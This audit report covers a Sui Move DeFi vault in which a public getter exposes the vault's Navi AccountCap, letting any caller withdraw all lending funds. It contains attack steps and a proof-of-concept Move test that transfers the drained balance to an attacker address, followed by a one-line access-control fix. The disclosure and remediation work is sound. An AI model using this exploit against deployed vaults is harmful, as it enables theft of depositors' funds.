# Audit Report

## Title
Public AccountCap Exposure Enables Complete Bypass of Vault Locking Window and Withdrawal Security

## Summary
The vault's `get_defi_asset` function exposes an immutable reference to the vault's NaviAccountCap, which can be used by any attacker to call the public `incentive_v3::withdraw_with_account_cap` function and drain all funds from the vault's Navi lending positions, completely bypassing the 12-hour locking window, withdrawal request system, share burning, and all vault security mechanisms.

## Finding Description

The vulnerability exists due to a dangerous combination of two public functions:

**First vulnerability component:** The vault's `get_defi_asset` function is declared as `public fun` with zero authorization checks. [1](#0-0) 

This allows any external address to obtain an immutable reference (`&AssetType`) to any DeFi asset stored in the vault's `assets: Bag`, including the critical NaviAccountCap that controls the vault's Navi lending positions.

**Second vulnerability component:** The Navi protocol's `incentive_v3::withdraw_with_account_cap` function is also `public fun` and accepts an AccountCap reference to perform withdrawals. [2](#0-1) 

This function:
1. Extracts the owner address from the AccountCap
2. Updates reward states
3. Calls the underlying `lending::withdraw_with_account_cap` which performs the actual withdrawal
4. Returns the withdrawn `Balance<CoinType>` **directly to the caller**

The lending core's withdrawal implementation extracts funds from the AccountCap owner's positions and returns them to whoever called the function. [3](#0-2) 

**Attack execution:**
```
1. attacker_balance = vault.get_defi_asset<USDC, NaviAccountCap>("AccountCap0")
2. stolen_balance = incentive_v3::withdraw_with_account_cap(
     clock, oracle, storage, pool, asset, MAX_U64, 
     incentive_v2, incentive_v3, attacker_balance)
3. stolen_coin = coin::from_balance(stolen_balance, ctx)
4. transfer::public_transfer(stolen_coin, attacker_address)
```

**Bypassed security mechanisms:**

The vault's legitimate withdrawal flow enforces critical security checks that are completely circumvented:
- The locking window check (12 hours by default) [4](#0-3) 
- The withdrawal request system requiring request IDs
- Share burning to maintain vault accounting integrity  
- Withdrawal fee collection
- Recipient validation

These protections exist in the vault's intended flow but are never reached when using the AccountCap directly.

## Impact Explanation

**Critical Fund Theft:** An attacker can steal 100% of the funds deposited into Navi lending positions through the vault's NaviAccountCap without owning any vault shares or requiring any authorization. If the vault has $10M in Navi positions, all $10M can be stolen in a single transaction.

**Bypassed Security Layers:**
- **Locking window**: The 12-hour withdrawal delay is completely bypassed - instant theft is possible
- **Request system**: No withdrawal request or request ID needed
- **Share accounting**: Attacker doesn't need vault shares; shares remain but backing is stolen
- **Fee collection**: Withdrawal fees never collected
- **Access control**: No authorization checks whatsoever

**Vault State Corruption:** The vault's share supply remains unchanged while the underlying Navi position value drops to zero, causing severe undercollateralization. All legitimate depositors experience 100% loss of their proportional Navi position value while their share balances remain the same - the shares become worthless.

**Severity Justification:** CRITICAL - This represents direct theft of custody with no special privileges, no attack preconditions beyond the vault having Navi positions, and trivial execution complexity.

## Likelihood Explanation

**Attacker Profile:** Any external address with basic blockchain interaction capability can execute this attack. No operator role, admin privileges, vault shares, or specialized knowledge required.

**Attack Complexity:** Trivially simple - requires exactly two public function calls with readily available parameters. The NaviAccountCap is stored in a deterministic location in the vault's assets Bag using a predictable key format (generated via `vault_utils::parse_key<NaviAccountCap>(idx)`). [5](#0-4) 

**Preconditions:** Only requires that the vault has created Navi lending positions, which is a core feature of the vault system. This is demonstrated in test setup code. [6](#0-5) 

**Detection Difficulty:** The attack appears as normal Navi protocol withdrawals at the Navi layer, making real-time prevention nearly impossible. Only post-hoc vault reconciliation would reveal the missing funds.

**Probability Assessment:** HIGH - The exploit path is straightforward with guaranteed success. Both functions are unconditionally public, accept the correct parameter types (immutable references), and have no authorization barriers.

## Recommendation

**Immediate Fix:** Change `get_defi_asset` from `public fun` to `public(package) fun` to restrict access to only internal vault modules:

```move
// BEFORE (VULNERABLE):
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}

// AFTER (SECURE):
public(package) fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**Root Cause:** The vulnerability stems from exposing custody-critical capabilities (AccountCap references) through public getter functions. In Sui Move, even immutable references to capability objects can be dangerous when external protocol functions accept such references for privileged operations.

**Additional Hardening:** Review all public functions that return references to stored assets and ensure they cannot be combined with external protocol functions to bypass vault security. Consider implementing a whitelist of approved callers for sensitive asset access patterns.

## Proof of Concept

```move
#[test]
public fun test_vault_navi_account_cap_theft() {
    let mut s = test_scenario::begin(ATTACKER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Setup vault with Navi position (as admin)
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<USDC>(&mut s);
    
    s.next_tx(OWNER);
    {
        let mut vault = s.take_shared<Vault<USDC>>();
        let navi_account_cap = lending::create_account(s.ctx());
        vault.add_new_defi_asset(0, navi_account_cap);
        
        // Deposit 1M USDC into Navi via vault
        let deposit_coin = coin::mint_for_testing<USDC>(1_000_000_000_000, s.ctx());
        // ... legitimate vault deposit and Navi lending operations ...
        test_scenario::return_shared(vault);
    };
    
    // ATTACK: External attacker steals all funds
    s.next_tx(ATTACKER);
    {
        let vault = s.take_shared<Vault<USDC>>();
        let mut storage = s.take_shared<Storage>();
        let mut pool = s.take_shared<Pool<USDC>>();
        let mut incentive_v2 = s.take_shared<IncentiveV2>();
        let mut incentive_v3 = s.take_shared<IncentiveV3>();
        let oracle = s.take_shared<PriceOracle>();
        
        // Step 1: Get reference to vault's NaviAccountCap
        let account_cap_ref = vault.get_defi_asset<USDC, NaviAccountCap>(
            vault_utils::parse_key<NaviAccountCap>(0)
        );
        
        // Step 2: Withdraw ALL funds using the stolen reference
        let stolen_balance = incentive_v3::withdraw_with_account_cap<USDC>(
            &clock,
            &oracle,
            &mut storage,
            &mut pool,
            0, // asset ID
            type(u64).max, // withdraw maximum amount
            &mut incentive_v2,
            &mut incentive_v3,
            account_cap_ref // Using vault's AccountCap!
        );
        
        // Step 3: Convert to Coin and keep the stolen funds
        let stolen_coin = coin::from_balance(stolen_balance, s.ctx());
        assert!(stolen_coin.value() == 1_000_000_000_000, 0); // All 1M USDC stolen
        
        transfer::public_transfer(stolen_coin, ATTACKER);
        
        // Vault state is now corrupted - shares exist but Navi backing is gone
        test_scenario::return_shared(vault);
        test_scenario::return_shared(storage);
        test_scenario::return_shared(pool);
        test_scenario::return_shared(incentive_v2);
        test_scenario::return_shared(incentive_v3);
        test_scenario::return_shared(oracle);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

### Citations

**File:** volo-vault/sources/volo_vault.move (L35-35)
```text
const DEFAULT_LOCKING_TIME_FOR_WITHDRAW: u64 = 12 * 3600 * 1_000; // 12 hours to withdraw after a deposit
```

**File:** volo-vault/sources/volo_vault.move (L1451-1456)
```text
public fun get_defi_asset<PrincipalCoinType, AssetType: key + store>(
    self: &Vault<PrincipalCoinType>,
    asset_type: String,
): &AssetType {
    self.assets.borrow<String, AssetType>(asset_type)
}
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/incentive_v3.move (L853-869)
```text
    public fun withdraw_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        incentive_v2: &mut IncentiveV2,
        incentive_v3: &mut Incentive,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        let owner = account::account_owner(account_cap);
        incentive_v2::update_reward_all(clock, incentive_v2, storage, asset, owner);
        update_reward_state_by_asset<CoinType>(clock, incentive_v3, storage, owner);

        lending::withdraw_with_account_cap<CoinType>(clock, oracle, storage, pool, asset, amount, account_cap)
    }
```

**File:** volo-vault/local_dependencies/protocol/lending_core/sources/lending.move (L494-504)
```text
    public(friend) fun withdraw_with_account_cap<CoinType>(
        clock: &Clock,
        oracle: &PriceOracle,
        storage: &mut Storage,
        pool: &mut Pool<CoinType>,
        asset: u8,
        amount: u64,
        account_cap: &AccountCap
    ): Balance<CoinType> {
        base_withdraw(clock, oracle, storage, pool, asset, amount, account::account_owner(account_cap))
    }
```

**File:** volo-vault/sources/utils.move (L14-20)
```text
public fun parse_key<T>(idx: u8): AsciiString {
    let type_name_string_ascii = type_name::get<T>().into_string();
    let mut type_name_string = string::from_ascii(type_name_string_ascii);

    type_name_string.append(idx.to_string());
    type_name_string.to_ascii()
}
```

**File:** volo-vault/tests/init_vault.move (L76-90)
```text
public fun init_navi_account_cap<PrincipalCoinType>(
    s: &mut Scenario,
    vault: &mut Vault<PrincipalCoinType>,
) {
    let owner = s.sender();

    s.next_tx(owner);
    {
        let navi_account_cap = lending::create_account(s.ctx());
        vault.add_new_defi_asset(
            0,
            navi_account_cap,
        );
    }
}
```
